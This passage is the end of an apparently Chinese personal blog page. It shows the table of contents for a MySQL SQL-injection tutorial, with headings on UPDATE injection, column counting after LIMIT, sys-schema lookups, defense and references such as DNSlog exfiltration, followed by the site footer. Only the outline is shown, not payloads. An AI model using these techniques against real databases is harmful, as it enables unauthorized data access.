field1=new_value,field1=new_value2 [where]，最终field1字段的内容为new_value2，可用这个特性来进行UPDATA注入。如：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x18-LIMIT之后的字段数判断"><span class="nav-number">2.15.</span> <span class="nav-text">0x18.LIMIT之后的字段数判断</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#我们都知道若注入点在where子语句之后，判断字段数可以用order-by或group-by来进行判断，而limit后可以利用-into-判断字段数，其中-为mysql临时变量。"><span class="nav-number">2.15.0.1.</span> <span class="nav-text">我们都知道若注入点在where子语句之后，判断字段数可以用order by或group by来进行判断，而limit后可以利用 into @,@ 判断字段数，其中@为mysql临时变量。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如：-15"><span class="nav-number">2.15.0.2.</span> <span class="nav-text">例如：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x19-sys系统库"><span class="nav-number">2.16.</span> <span class="nav-text">0x19.sys系统库</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#节选自：Mysql的奇淫技巧-黑科技"><span class="nav-number">2.16.0.1.</span> <span class="nav-text">节选自：Mysql的奇淫技巧(黑科技)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#还有就是mysql数据库也可以查询表名、库名。"><span class="nav-number">2.16.0.2.</span> <span class="nav-text">还有就是mysql数据库也可以查询表名、库名。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x20-Mysql注入防御"><span class="nav-number">2.17.</span> <span class="nav-text">0x20.Mysql注入防御</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x21-结语"><span class="nav-number">2.18.</span> <span class="nav-text">0x21.结语</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#东西有点多，可能要慢慢吸收。"><span class="nav-number">2.18.0.1.</span> <span class="nav-text">东西有点多，可能要慢慢吸收。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x22-参考"><span class="nav-number">2.19.</span> <span class="nav-text">0x22.参考</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#【PHP代码审计】入门之路——第二篇-宽字节注入"><span class="nav-number">2.19.0.1.</span> <span class="nav-text">【PHP代码审计】入门之路——第二篇-宽字节注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#MySQL注入技巧"><span class="nav-number">2.19.0.2.</span> <span class="nav-text">MySQL注入技巧</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Mysql-注入基础小结"><span class="nav-number">2.19.0.3.</span> <span class="nav-text">Mysql 注入基础小结</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Mysql的奇淫技巧-黑科技"><span class="nav-number">2.19.0.4.</span> <span class="nav-text">Mysql的奇淫技巧(黑科技)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Read-MySQL-Client’s-File"><span class="nav-number">2.19.0.5.</span> <span class="nav-text">Read MySQL Client’s File</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Dnslog在SQL注入中的实战"><span class="nav-number">2.19.0.6.</span> <span class="nav-text">Dnslog在SQL注入中的实战</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#从安全角度深入理解MySQL编码转换机制"><span class="nav-number">2.19.0.7.</span> <span class="nav-text">从安全角度深入理解MySQL编码转换机制</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#mysql-sys-Schema-Object-Index"><span class="nav-number">2.19.0.8.</span> <span class="nav-text">mysql sys Schema Object Index</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#对MYSQL注入相关内容及部分Trick的归类小结"><span class="nav-number">2.19.0.9.</span> <span class="nav-text">对MYSQL注入相关内容及部分Trick的归类小结</span></a></li></ol></li></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ljdd520</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">195.6k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
